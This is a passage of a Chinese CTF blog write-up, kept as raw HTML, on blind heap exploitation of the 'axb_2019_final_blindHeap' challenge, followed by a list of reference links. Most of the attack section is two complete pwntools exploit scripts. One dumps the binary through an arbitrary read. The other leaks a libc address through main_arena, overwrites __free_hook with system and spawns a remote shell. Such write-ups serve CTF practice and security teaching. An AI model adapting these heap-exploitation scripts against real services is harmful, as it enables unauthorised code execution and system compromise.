class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">&quot;./axb_2019_final_blindHeap&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump_file</span>():</span></span><br><span class="line">    had_received_length=<span class="number">0</span></span><br><span class="line">    file_content=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = get_sh()</span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;Enter your name(1~32):&#x27;</span>)</span><br><span class="line">            sh.send(<span class="string">&#x27;A&#x27;</span> * <span class="number">0x18</span> + <span class="string">&#x27;Leak---&gt;&#x27;</span>)</span><br><span class="line">            Add_shopping_cart(sh,<span class="number">0x150</span>,<span class="string">&#x27;Chunk_0&#x27;</span>,<span class="number">0x8</span>,<span class="string">&#x27;Chunk_0&#x27;</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">            sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">            sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;Leak---&gt;&#x27;</span>)</span><br><span class="line">            first_chunk_addr=u64(sh.recvuntil(<span class="string">&#x27;&#x27;</span>s<span class="string">&#x27;).strip(&#x27;</span><span class="string">&#x27;s&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;x00&#x27;</span>)) - <span class="number">0x150</span> - <span class="number">0x10</span> - <span class="number">0x10</span> - <span class="number">0x10</span></span><br><span class="line">            log.success(<span class="string">&#x27;We leak the first chunk address is &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(first_chunk_addr)))</span><br><span class="line">            padding = ( <span class="number">0x100</span> - (first_chunk_addr &amp; <span class="number">0xFF</span>) ) - <span class="number">0x10</span></span><br><span class="line">            payload = <span class="string">&#x27;A&#x27;</span> * padding + p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) </span><br><span class="line">            payload += p64(<span class="number">0xC</span>) + p64(<span class="number">0x400000</span>+had_received_length) </span><br><span class="line">            payload += p64(<span class="number">0xC</span>) + p64(<span class="number">0x400000</span>+had_received_length)</span><br><span class="line">            Display_product(sh,<span class="number">1</span>)</span><br><span class="line">            Modify_product(sh,<span class="number">0</span>,<span class="string">&#x27;Chunk_0&#x27;</span>,payload)</span><br><span class="line">            Change_name(sh,<span class="string">&#x27;A&#x27;</span> * <span class="number">0x18</span> + <span class="string">&#x27;Leak---&gt;&#x27;</span>)</span><br><span class="line">            Display_product(sh,<span class="number">1</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;commodity&#x27;</span>s name <span class="keyword">is</span> <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">            received_data = sh.recvuntil(&#x27;</span>x0Acommo<span class="string">&#x27;,timeout=1)[:-6]</span></span><br><span class="line"><span class="string">            if len(received_data) == 0 :</span></span><br><span class="line"><span class="string">                file_content += &#x27;</span>x00<span class="string">&#x27;</span></span><br><span class="line"><span class="string">                had_received_length += 1</span></span><br><span class="line"><span class="string">            else :</span></span><br><span class="line"><span class="string">                file_content += received_data</span></span><br><span class="line"><span class="string">                had_received_length += len(received_data)</span></span><br><span class="line"><span class="string">            log.info(&#x27;</span>We have get <span class="string">&#x27; + str(had_received_length) +&#x27;</span>byte file!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">            sh.close()</span></span><br><span class="line"><span class="string">        except:</span></span><br><span class="line"><span class="string">            log.info(&#x27;</span>We get <span class="string">&#x27; + str(had_received_length) +&#x27;</span> byte file!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">            with open(&#x27;</span>axb_2019_final_blindHeap_dump<span class="string">&#x27;,&#x27;</span>w<span class="string">b&#x27;) as fout:</span></span><br><span class="line"><span class="string">                fout.write(file_content)</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">            sh.close()</span></span><br><span class="line"><span class="string">            pass</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Dump_file()</span></span><br><span class="line"><span class="string">sh = get_sh()</span></span><br><span class="line"><span class="string">sh.recvuntil(&#x27;</span>Enter your name(<span class="number">1</span>~<span class="number">32</span>):<span class="string">&#x27;)</span></span><br><span class="line">sh.send(&#x27;A&#x27; * 0x18 + &#x27;Leak---&gt;&#x27;)</span><br><span class="line">Add_shopping_cart(sh,<span class="number">0x150</span>,<span class="string">&#x27;Chunk_0&#x27;</span>,<span class="number">0x8</span>,<span class="string">&#x27;Chunk_0&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Leak---&gt;&#x27;</span>)</span><br><span class="line">first_chunk_addr=u64(sh.recvuntil(<span class="string">&#x27;&#x27;</span>s<span class="string">&#x27;).strip(&#x27;</span><span class="string">&#x27;s&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;x00&#x27;</span>)) - <span class="number">0x150</span> - <span class="number">0x10</span> - <span class="number">0x10</span> - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&#x27;We leak the first chunk address is &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(first_chunk_addr)))</span><br><span class="line">padding = ( <span class="number">0x100</span> - (first_chunk_addr &amp; <span class="number">0xFF</span>) ) - <span class="number">0x10</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * padding + p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) </span><br><span class="line">payload += p64(<span class="number">0xC</span>) + p64(<span class="number">0x603028</span>) </span><br><span class="line">payload += p64(<span class="number">0xC</span>) + p64(<span class="number">0x603018</span>)</span><br><span class="line">Display_product(sh,<span class="number">1</span>)</span><br><span class="line">Modify_product(sh,<span class="number">0</span>,<span class="string">&#x27;Chunk_0&#x27;</span>,payload)</span><br><span class="line">Change_name(sh,<span class="string">&#x27;A&#x27;</span> * <span class="number">0x18</span> + <span class="string">&#x27;Leak---&gt;&#x27;</span>)</span><br><span class="line">Display_product(sh,<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;commodity&#x27;</span>s name <span class="keyword">is</span> <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">puts_addr = u64(sh.recvuntil(&#x27;</span>x0Acommo<span class="string">&#x27;)[:-6].ljust(8,&#x27;</span>x00<span class="string">&#x27;))</span></span><br><span class="line"><span class="string">libc_base = puts_addr - libc.symbols[&#x27;</span>puts<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.symbols[&#x27;</span>system<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">bin_sh_addr = libc_base + libc.search(&#x27;</span>/<span class="built_in">bin</span>/sh<span class="string">&#x27;).next()</span></span><br><span class="line"><span class="string">log.success(&#x27;</span>We get libc base address <span class="keyword">is</span> <span class="string">&#x27; + str(hex(libc_base)))</span></span><br><span class="line"><span class="string">log.success(&#x27;</span>We get system address <span class="keyword">is</span> <span class="string">&#x27; + str(hex(system_addr)))</span></span><br><span class="line"><span class="string">Add_shopping_cart(sh,0x8,&#x27;</span>/<span class="built_in">bin</span>/shx00<span class="string">&#x27;,0x8,&#x27;</span>/<span class="built_in">bin</span>/shx00<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">Modify_product(sh,0,p64(puts_addr),p64(system_addr))</span></span><br><span class="line"><span class="string">gdb.attach(sh)</span></span><br><span class="line"><span class="string">Delete_shopping_cart(sh,just_one,1)</span></span><br><span class="line"><span class="string">sh.interactive()</span></span><br><span class="line"><span class="string">sh.close()</span></span><br></pre></td></tr></table></figure>
<p>⚠：经测试，远端开启了PIE+ASLR，导致本思路不再可用，我们使用另外的思路进行攻击。</p>
<p>⚠：经测试，远端文件和本地测试文件不同，当我们调用display函数时不再泄露函数地址。</p>
<p><strong>泄露main_arena，Leak libc base</strong></p>
<p>我们还是利用刚才的思路进行任意地址读，但是在此之前，我们需要先在我们所有申请的chunk后方布置一个大小大于<code>fast_max</code>(一般是0x80)的chunk。那么当我们释放它后，会将main_arena的内容写进fd域和bk域，由于无法得知程序加载位置，我们也不能泄露文件，也就无从得知文件逻辑（不知道到底main_arena的内容会在name中还是description中），我们可以基于第一个Chunk的地址推知其余Chunk的地址，那么我们直接针对其name和description进行读</p>
<p><a target="_blank" rel="noopener" href="https://p2.ssl.qhimg.com/dm/1024_640_/t01d6983392478b9475.png"><img src="%E7%9B%B2%E6%89%93/t01d6983392478b9475.png" alt="img"></a></p>
<p>顺利泄露，我们可以以此为据计算libc基址，经查阅libc，此libc的main_arena地址为0x3C4B78。</p>
<p><strong>篡改free_hook</strong></p>
<p>接下来我们采用改写free_hook的利用方式。</p>
<p>但是我们已经改变了堆结构，无法进行empty (chunk_0)，已经没有可控地址了。</p>
<p>此处我们可以在一开始再次提前布置一个Ctrl_Chunk，我们的Chunk 0，可以对两个任意地址进行读写操作，那么我们可以将main_arena的地址放在第一个地址进行泄露，然后将<code>Ctrl_Chunk-&gt;cart</code>的<code>data</code>域放在第二个地址进行任意写，那么相当于我们又拥有了两个任意地址进行读写操作。那么构造payload改写free_hook即可。</p>
<p><strong>Final EXP</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">all_commodity=<span class="number">1</span></span><br><span class="line">just_one=<span class="number">2</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># file_name=ELF(&quot;./&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add_shopping_cart</span>(<span class="params">sh,product_descript_size,product_descript,product_name_size,product_name</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please tell me the desrcription&#x27;</span>s size.n<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    sh.sendline(str(product_descript_size))</span></span><br><span class="line"><span class="string">    sh.recvuntil(&#x27;</span>please tell me the desrcript of commodity.n<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    sh.sendline(product_descript)</span></span><br><span class="line"><span class="string">    sh.recvuntil(&#x27;</span>please tell me the commodity-name<span class="string">&#x27;s size.n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(product_name_size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please tell me the commodity-name.n&#x27;</span>)</span><br><span class="line">    sh.sendline(product_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Modify_product</span>(<span class="params">sh,index,product_name,product_descript</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;The index is &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please tell me the new commodity&#x27;</span>s name.n<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    sh.sendline(product_name)</span></span><br><span class="line"><span class="string">    sh.recvuntil(&#x27;</span>please tell me the new commodity<span class="string">&#x27;s desrcription.n&#x27;</span>)</span><br><span class="line">    sh.sendline(product_descript)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Display_product</span>(<span class="params">sh,mode,index=null</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(mode))</span><br><span class="line">    <span class="keyword">if</span> mode <span class="keyword">is</span> just_one:</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;The index is &#x27;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Buy_shopping_cart</span>(<span class="params">sh</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete_shopping_cart</span>(<span class="params">sh,mode,index=null</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(mode))</span><br><span class="line">    <span class="keyword">if</span> mode <span class="keyword">is</span> just_one:</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;The index is &#x27;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change_name</span>(<span class="params">sh,new_name</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Change your name(1~32):&#x27;</span>)</span><br><span class="line">    sh.sendline(new_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span>():</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">&quot;./axb_2019_final_blindHeap&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh = get_sh()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Enter your name(1~32):&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">&#x27;A&#x27;</span> * <span class="number">0x18</span> + <span class="string">&#x27;Leak---&gt;&#x27;</span>)</span><br><span class="line">Add_shopping_cart(sh,<span class="number">0x150</span>,<span class="string">&#x27;Chunk_0&#x27;</span>,<span class="number">0x8</span>,<span class="string">&#x27;Chunk_0&#x27;</span>)</span><br><span class="line">Add_shopping_cart(sh,<span class="number">0x100</span>,<span class="string">&#x27;Chunk_1&#x27;</span>,<span class="number">0x100</span>,<span class="string">&#x27;Chunk_1&#x27;</span>)</span><br><span class="line">Add_shopping_cart(sh,<span class="number">0x100</span>,<span class="string">&#x27;Chunk_2&#x27;</span>,<span class="number">0x100</span>,<span class="string">&#x27;Chunk_2&#x27;</span>)</span><br><span class="line">Add_shopping_cart(sh,<span class="number">0x100</span>,<span class="string">&#x27;Chunk_3&#x27;</span>,<span class="number">0x100</span>,<span class="string">&#x27;Chunk_3&#x27;</span>)</span><br><span class="line">Add_shopping_cart(sh,<span class="number">0x100</span>,<span class="string">&#x27;/bin/shx00&#x27;</span>,<span class="number">0x100</span>,<span class="string">&#x27;/bin/shx00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Delete_shopping_cart(sh,just_one,<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Leak---&gt;&#x27;</span>)</span><br><span class="line">first_chunk_cart_addr=u64(sh.recvuntil(<span class="string">&#x27;&#x27;</span>s<span class="string">&#x27;).strip(&#x27;</span><span class="string">&#x27;s&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">first_chunk_name_addr=first_chunk_cart_addr - <span class="number">0x10</span>  - <span class="number">0x10</span></span><br><span class="line">first_chunk_desc_addr=first_chunk_name_addr - <span class="number">0x10</span>  - <span class="number">0x150</span></span><br><span class="line">leak__chunk_desc_addr=first_chunk_cart_addr + <span class="number">0x20</span>  + <span class="number">0x10</span></span><br><span class="line">leak__chunk_name_addr=leak__chunk_desc_addr + <span class="number">0x100</span> + <span class="number">0x10</span></span><br><span class="line">leak__chunk_cart_addr=leak__chunk_name_addr + <span class="number">0x100</span> + <span class="number">0x10</span></span><br><span class="line">ctrol_chunk_desc_addr=leak__chunk_cart_addr + <span class="number">0x20</span>  + <span class="number">0x10</span></span><br><span class="line">ctrol_chunk_name_addr=ctrol_chunk_desc_addr + <span class="number">0x100</span> + <span class="number">0x10</span></span><br><span class="line">ctrol_chunk_cart_addr=ctrol_chunk_name_addr + <span class="number">0x100</span> + <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&#x27;Chunk_0 -&gt; name        : &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(first_chunk_name_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;Chunk_0 -&gt; description : &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(first_chunk_desc_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;Chunk_0 -&gt; cart        : &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(first_chunk_cart_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;Chunk_1 -&gt; name        : &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(leak__chunk_name_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;Chunk_1 -&gt; description : &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(leak__chunk_desc_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;Chunk_1 -&gt; cart        : &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(leak__chunk_cart_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;Chunk_2 -&gt; name        : &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(ctrol_chunk_name_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;Chunk_2 -&gt; description : &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(ctrol_chunk_desc_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;Chunk_2 -&gt; cart        : &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(ctrol_chunk_cart_addr)))</span><br><span class="line">padding = ( <span class="number">0x100</span> - (first_chunk_desc_addr &amp; <span class="number">0xFF</span>) ) - <span class="number">0x10</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * padding + p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) </span><br><span class="line">payload += p64(<span class="number">0x20</span>) + p64(leak__chunk_name_addr) </span><br><span class="line">payload += p64(<span class="number">0x20</span>) + p64(ctrol_chunk_cart_addr)</span><br><span class="line">Modify_product(sh,<span class="number">0</span>,<span class="string">&#x27;Chunk_0&#x27;</span>,payload)</span><br><span class="line">Change_name(sh,<span class="string">&#x27;A&#x27;</span> * <span class="number">0x18</span> + <span class="string">&#x27;Leak---&gt;&#x27;</span>)</span><br><span class="line">Display_product(sh,all_commodity)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;commodity&#x27;</span>s name <span class="keyword">is</span> <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">main_arena_addr = u64(sh.recvuntil(&#x27;</span>x0Acommo<span class="string">&#x27;)[:-6].ljust(8,&#x27;</span>x00<span class="string">&#x27;))</span></span><br><span class="line"><span class="string">log.success(&#x27;</span>We get main arena address <span class="keyword">is</span> <span class="string">&#x27; + str(hex(main_arena_addr)))</span></span><br><span class="line"><span class="string">libc_base = main_arena_addr - 0x3C4B78</span></span><br><span class="line"><span class="string">free_hook = libc_base + libc.symbols[&#x27;</span>__free_hook<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.symbols[&#x27;</span>system<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">bin_sh_addr = libc_base + libc.search(&#x27;</span>/<span class="built_in">bin</span>/sh<span class="string">&#x27;).next()</span></span><br><span class="line"><span class="string">log.success(&#x27;</span>We get libc base address <span class="keyword">is</span> <span class="string">&#x27; + str(hex(libc_base)))</span></span><br><span class="line"><span class="string">log.success(&#x27;</span>We get system address <span class="keyword">is</span> <span class="string">&#x27; + str(hex(system_addr)))</span></span><br><span class="line"><span class="string">sh.recvline()</span></span><br><span class="line"><span class="string">payload  = p64(0x20) + p64(free_hook) </span></span><br><span class="line"><span class="string">payload += p64(0x20) + p64(free_hook)</span></span><br><span class="line"><span class="string">Display_product(sh,all_commodity)</span></span><br><span class="line"><span class="string">Modify_product(sh,0,p64(main_arena_addr),payload)</span></span><br><span class="line"><span class="string">Display_product(sh,all_commodity)</span></span><br><span class="line"><span class="string">Modify_product(sh,2,p64(system_addr),p64(system_addr))</span></span><br><span class="line"><span class="string">Delete_shopping_cart(sh,just_one,3)</span></span><br><span class="line"><span class="string">sh.interactive()</span></span><br></pre></td></tr></table></figure>


<h2 id="0x06-其他的盲打系列-探测栈溢出"><a href="#0x06-其他的盲打系列-探测栈溢出" class="headerlink" title="0x06 其他的盲打系列(探测栈溢出)"></a>0x06 其他的盲打系列(探测栈溢出)</h2><p>题目为<code>GXYCTF</code>的题目，暂无任何复现环境，因此等待更新。</p>
<h2 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6984">blind-pwn系列总结+创新</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6912">安洵杯2019 官方Writeup(Re/Pwn/Crypto) – D0g3</a></p>
<p><a target="_blank" rel="noopener" href="https://goldsnow.github.io/2017/03/30/x64%E4%B9%8B__libc_csu_init%E9%80%9A%E7%94%A8gadget/">x64 之 __libc_csu_init 通用gadget</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Ox9A82/p/5487725.html">__libc_csu_init函数的通用gadget</a></p>
<p>[Blind Return Oriented Programming (BROP) Attack – 攻击原理](<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Blind">https://wooyun.js.org/drops/Blind</a> Return Oriented Programming (BROP)</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85731">【CTF攻略】格式化字符串blind pwn详细教程</a></p>
<p><a target="_blank" rel="noopener" href="https://luomuxiaoxiao.com/?p=516">Linux X86 程序启动 – main函数是如何被执行的？</a></p>

    </div>
    <!--文末结束语-->
    
        <div style="text-align:center;color: #ccc;font-size:14px;"> --- 本文结束 <i class="fas fa-heart"></i> The End --- </div>
    
    <!--页脚广告-->
    
    <v-divider></v-divider>
    
    <div class="post-nav">             
        
            <div class="post-nav-button float-left">
                <v-icon>chevron_left</v-icon>
                <a class="font-weight-bold text-left" href="/2021/01/19/Game/%E6%98%9FCTF/">
                    2021 *CTF
                </a>
            </div>
              
          
            <div class="post-nav-button float-right">
                <a class="font-weight-bold text-right" href="/2021/01/15/Utils/c-pwntools/">      
                    一些实用技巧整理
                </a>
                <v-icon>chevron_right</v-icon>
            </div>
        
    </div>
</v-card>



        
                            <div id="mobile-footer" class="d-block d-md-none">
                                <v-divider></v-divider>
                                <div id="mobile-footer-content">
                                    <span>Theme: <a target="_blank" rel="noopener" href="https://github.com/kb1000fx/hexo-theme-insulin">Insulin</a> &nbsp; Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a></span><br>
                                    <span> &copy; 2020 - 2021 Clindy</span>
                                </div>
                            </div>                   
                        </v-col>                                            
                    </v-row>
                </v-container>
            </v-content>
        </v-app>
    </div>
    
<script src="https://cdn.jsdelivr.net/npm/vue@2.6.11"></script>
<script src="https://cdn.jsdelivr.net/npm/vuetify@2.2.30"></script>
<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/js-base64@3.5.2/base64.min.js"></script>

<script src="/js/main.js"></script>




    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




    <script src="https://cdn.jsdelivr.net/npm/mermaid@8.4.8/dist/mermaid.min.js"></script>
    <script>mermaid.initialize({
        startOnLoad: true,
        theme: "default"
    });</script>





</body>
</html>